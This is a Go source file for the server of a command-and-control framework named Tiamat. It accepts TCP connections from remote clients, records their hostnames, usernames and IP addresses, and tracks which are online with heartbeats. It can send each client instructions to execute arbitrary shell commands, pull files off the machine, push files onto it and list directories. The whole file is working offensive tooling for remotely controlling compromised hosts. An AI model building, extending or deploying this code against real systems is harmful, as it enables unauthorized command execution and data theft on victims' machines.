package cmd

import (
	"encoding/gob"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net"
	"os"
	"time"

	"github.com/spf13/viper"
)

var (
	C2Port     string = "1302"
	clientList []Client
	clientIDs  int = 0

	heartbeatRate time.Duration = 15

	servInsecure bool

	isUsingJSONParameter bool
	clientJSONPath       string = "/.config/tiamat/clients.json"
)

func (c Client) Instruct(i Instructions) error {
	enc := gob.NewEncoder(c.Conn)
	err := enc.Encode(i)
	if err != nil {
		return err
	}
	return nil
}

func setClientPath() (string, error) {
	var fileToOpen string
	home, err := os.UserHomeDir()
	if err != nil {
		return "", err
	}
	if isUsingJSONParameter == false {
		fileToOpen = home + clientJSONPath
		configPath := viper.GetString("Server.ClientPath")
		if configPath != "" {
			fileToOpen = configPath
		}
	} else {
		fileToOpen = clientJSONPath
	}

	return fileToOpen, nil
}

func recoverClients() error {
	fileToOpen, err := setClientPath()
	if err != nil {
		return err
	}

	clients := ClientJSON{}
	file, err := os.Open(fileToOpen)
	if err != nil {
		if os.IsNotExist(err) {
			log.Printf("Missing file at %v\n", fileToOpen)
			return nil
		}
		return err
	}
	jsonParse := json.NewDecoder(file)
	if err = jsonParse.Decode(&clients); err != nil {
		return err
	}
	for _, v := range clients.List {
		client := Client{}
		client.ClientBasicInfo = v
		client.IsOnline = false
		client.ClientID = clientIDs
		clientIDs++
		clientList = append(clientList, client)
	}
	return nil
}

func Server() {
	log.SetPrefix("[TIAMAT] ")
	p := viper.GetString("Server.Port")
	if p != "" {
		C2Port = p
	}
	go WebServer()

	if err := recoverClients(); err != nil {
		log.Fatalf("Error happened recovering clients: %v\n", err)
	}

	ln, err := net.Listen("tcp", ":"+C2Port)
	if err != nil {
		log.Fatalf("Error happened listening on C2 port: %v\n", err)
	}
	log.Printf("Listening on port %v...", C2Port)
	defer ln.Close()

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Printf("Error happened accepting connection: %v\n", err)
		}
		handleConn(conn)
	}
}

func handleConn(conn net.Conn) {
	ID, err := getClient(conn)
	if err != nil {
		log.Printf("Error happened receiving OS information: %v\n", err)
		return
	}

	go Heartbeat(ID)
}

func downloadFileC2(client Client, filepath string) (Response, error) {
	checkTempFolder()
	inst := Instructions{
		IsDownload: true,
		Path:       filepath,
	}
	client.Instruct(inst)
	message, err := ServerMessageReceiver(client.Conn)
	if err != nil {
		log.Println(err)
		return message, err
	}

	return message, nil
}

func checkTempFolder() {
	if _, err := os.Stat("/tmp/tiamat/"); os.IsNotExist(err) {
		err := os.Mkdir("/tmp/tiamat", 0700)
		if err != nil {
			log.Printf("Error happened creating temp folder: %v\n", err)
		}
	}
}

func uploadFileC2(client Client, file multipart.FileHeader, whereToStore string) (Response, error) {
	openedFile, err := file.Open()
	if err != nil {
		log.Println(err)
	}
	byteArray, err := io.ReadAll(openedFile)
	if err != nil {
		log.Println(err)
	}
	inst := Instructions{
		IsUpload:     true,
		FileName:     file.Filename,
		FileContents: byteArray,
		Path:         whereToStore,
	}
	client.Instruct(inst)
	message, err := ServerMessageReceiver(client.Conn)
	if err != nil {
		log.Println(err)
		return message, err
	}
	return message, nil
}

func requestFiles(client Client, path string) (Response, error) {
	inst := Instructions{
		IsListFiles: true,
		Path:        path,
	}
	client.Instruct(inst)
	message, err := ServerMessageReceiver(client.Conn)
	if err != nil {
		log.Println(err)
		return message, err
	}
	return message, nil
}

func sendCommand(client Client, command string) (Output string, err error) {
	inst := Instructions{
		IsCommand: true,
		Message:   command,
	}
	client.Instruct(inst)
	resp, err := ServerMessageReceiver(client.Conn)
	if err != nil || resp.Successful != true {
		e := fmt.Errorf("%v\n", resp.Message)
		return "", e
	}
	return resp.Message, nil
}

func Heartbeat(ID int) {
	for {
		client, _, err := returnClient(ID)
		if err != nil {
			return
		}

		inst := Instructions{
			IsHeartbeat: true,
			Message:     "PING",
		}
		client.Instruct(inst)
		resp, err := ServerMessageReceiver(client.Conn)
		if err != nil {
			log.Printf("Client %v is offline :(\n", client.ClientBasicInfo.Hostname)
			client.IsOnline = false
			return
		}
		if resp.Message != "PONG" {
			continue
		} else {
			if client.IsOnline != true {
				client.IsOnline = true
			}
		}
		time.Sleep(time.Second * heartbeatRate)
	}
}

func returnClient(ID int) (*Client, int, error) {
	for i, v := range clientList {
		if v.ClientID == ID {
			return &clientList[i], i, nil
		}
	}
	err := fmt.Errorf("Client not found\n")
	return &Client{}, -1, err
}

func ServerMessageReceiver(conn net.Conn) (Response, error) {
	dec := gob.NewDecoder(conn)
	c := Response{}
	err := dec.Decode(&c)
	if err != nil {
		return Response{}, err
	}
	return c, nil
}

func getClient(conn net.Conn) (int, error) {
	dec := gob.NewDecoder(conn)
	basicC := ClientBasicInfo{}
	err := dec.Decode(&basicC)
	if err != nil {
		return -1, err
	}

	for i, v := range clientList {
		sameClient := basicC.Username == v.ClientBasicInfo.Username &&
			basicC.PublicIP == v.ClientBasicInfo.PublicIP &&
			basicC.Hostname == v.ClientBasicInfo.Hostname && basicC.LocalIP == v.ClientBasicInfo.LocalIP

		if sameClient == true {
			clientList[i].IsOnline = true
			clientList[i].Conn = conn
			log.Printf("Client %v is back online!\n", clientList[i].ClientBasicInfo.Hostname)
			return i, nil
		}
	}
	newC := Client{}
	newC.ClientBasicInfo = basicC
	newC.Conn = conn
	newC.IsOnline = true
	newC.ClientID = clientIDs
	clientIDs++
	log.Printf("Client %v is online!\n", newC.ClientBasicInfo.Hostname)

	clientList = append(clientList, newC)
	return len(clientList) - 1, nil
}
